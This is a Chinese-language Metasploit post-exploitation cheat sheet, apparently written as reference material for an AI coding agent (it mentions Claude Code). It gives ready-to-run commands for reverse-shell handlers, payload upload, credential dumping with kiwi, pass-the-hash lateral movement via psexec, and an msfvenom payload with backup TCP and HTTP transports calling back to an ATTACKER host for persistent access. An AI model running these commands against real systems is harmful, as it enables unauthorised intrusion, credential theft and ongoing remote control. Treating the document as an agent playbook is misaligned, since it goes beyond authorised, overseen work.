# Meterpreter 会话、转发与自动化

本文档补充 Metasploit 在拿到 session 之后的操作方法。重点是判断什么时候需要持久交互、什么时候只需要一次性模块，以及如何避免 handler 或 session 管理失控。

---

## Session 管理

拿到 shell 后先判断是否需要升级到 Meterpreter。普通 shell 适合执行少量命令；Meterpreter 更适合文件传输、路由、凭据、端口转发和后渗透模块。

```text
sessions -l
sessions -i <id>
sessions -u <id>
sessions -u <id> LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false
```

批量执行命令适合快速确认多台主机身份或环境，但不要对大量 session 直接运行高噪声命令：

```text
sessions -c "whoami"
sessions -i 10-20 -c "id"
```

`CTRL+Z` 可以把当前 session 放到后台，回到 `msfconsole` 主控台继续配置模块或 handler。

---

## 后台 Handler

长期监听 handler 时设置 `ExitOnSession false`，避免一个 session 断开后 handler 自动退出。

```text
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

如果需要在终端里长期保留 Metasploit，可放在 tmux/screen 中运行；在 Claude Code 内则优先使用 `interactive_session` 保持可读写的交互会话。

---

## Meterpreter 基础操作

### 提权与身份确认

```text
getuid
sysinfo
getsystem
```

`getsystem` 依赖当前权限和目标环境，不应作为必定成功的提权方式。失败后回到本地提权枚举，而不是重复执行。

### 文件传输

```text
upload /local/payload.exe C:\Windows\Temp\payload.exe
download C:\Users\Public\loot.txt /tmp/loot.txt
```

### 内存执行

`execute` 可用于从 Meterpreter 侧启动进程或加载文件，适合减少手工投递步骤，但仍会产生进程创建和安全产品检测面。

```text
execute -H -i -c -m -d calc.exe -f /root/tool.exe -a "arguments"
```

---

## 网络监听、端口转发与 SOCKS

### Packet recorder

网络抓包只在确有排障或凭据捕获需求时使用，避免产生大量磁盘与流量噪声。

```text
run packetrecorder -li
run packetrecorder -i 1
```

### Port forward

当攻击机无法直连内网服务，但 session 主机可达目标服务时使用 `portfwd`：

```text
portfwd add -l 7777 -r 172.17.0.2 -p 3006
```

判断标准：如果只需要访问少数固定端口，用 `portfwd`；如果需要多工具扫描或访问多个目标，改用 SOCKS。

### SOCKS proxy

```text
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
setg Proxies socks4:127.0.0.1:1080
```

设置全局代理后，后续支持代理的模块会走该 SOCKS。结束后用 `unsetg Proxies` 清理，避免后续模块误走旧路径。

---

## 凭据与横向移动

### Kiwi / Mimikatz

新版本 Metasploit 通常使用 `kiwi` 扩展承载 Mimikatz 类能力：

```text
load kiwi
creds_all
```

旧资料中的 `load mimikatz` / `mimikatz_command` 可能仍出现在历史环境中；实际使用时以当前 MSF 版本支持的扩展为准。

### Pass-the-Hash with PsExec

PsExec 模块适合已有 SMB 凭据或 NTLM hash 的 Windows 横向。它不是漏洞利用前置枚举；使用前先确认 445 可达、目标允许远程服务创建、凭据具备管理员权限。

```text
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set RHOSTS TARGET
set SMBUser USERNAME
set SMBPass LMHASH:NTHASH
run
```

---

## Resource script 自动化

`.rc` 文件适合重复搭建 handler、批量设置参数或把多个模块串成固定流程。不要把需要人工判断的后渗透步骤硬编码进 `.rc`，否则失败时很难知道停在哪一步。

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z
```

运行：

```bash
msfconsole -r ./handler.rc
```

---

## Multiple transports

Multiple transports 用于给 Meterpreter 配置备用回连路径，适合网络不稳定或需要 HTTP/TCP 多通道兜底的场景。

```bash
msfvenom -p windows/meterpreter_reverse_tcp \
  LHOST=ATTACKER LPORT=4444 \
  SessionRetryTotal=30 SessionRetryWait=10 \
  EXTENSIONS=stdapi,priv,powershell \
  EXTINIT=powershell,/path/AddTransports.ps1 \
  -f exe -o payload.exe
```

`AddTransports.ps1` 中再添加备用 TCP 或 Web transport：

```powershell
Add-TcpTransport -lhost ATTACKER -lport 4444 -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http://ATTACKER:8080/CHECKIN -RetryWait 10 -RetryTotal 30
```

如果只是一次性 CTF shell，不需要 multiple transports；它更适合持续访问和不稳定网络中的会话可靠性设计。
